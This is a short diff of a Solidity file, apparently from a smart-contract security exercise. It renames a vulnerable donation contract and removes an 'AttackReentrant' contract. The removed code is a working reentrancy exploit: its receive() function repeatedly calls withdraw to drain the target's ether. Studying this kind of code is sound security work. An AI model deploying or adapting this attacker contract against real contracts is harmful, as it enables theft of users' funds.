@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.12;
 
-contract Reentrance {
+contract Reentrancy {
     mapping(address => uint256) public balances;
 
     function donate(address _to) public payable {
@@ -23,24 +23,4 @@ contract Reentrance {
     }
 
     receive() external payable {}
-}
-
-contract AttackReentrant {
-    Reentrance public reentrance;
-
-    constructor(address _reentranceAddress) {
-        reentrance = Reentrance(payable(_reentranceAddress));
-    }
-
-    function withdraw() public {
-        reentrance.withdraw(reentrance.balanceOf(address(this)));
-    }
-
-    receive() external payable {
-        if (address(reentrance).balance > reentrance.balanceOf(address(this))) {
-            reentrance.withdraw(reentrance.balanceOf(address(this)));
-        } else if (address(reentrance).balance != 0) {
-            reentrance.withdraw(address(reentrance).balance);
-        }
-    }
 }
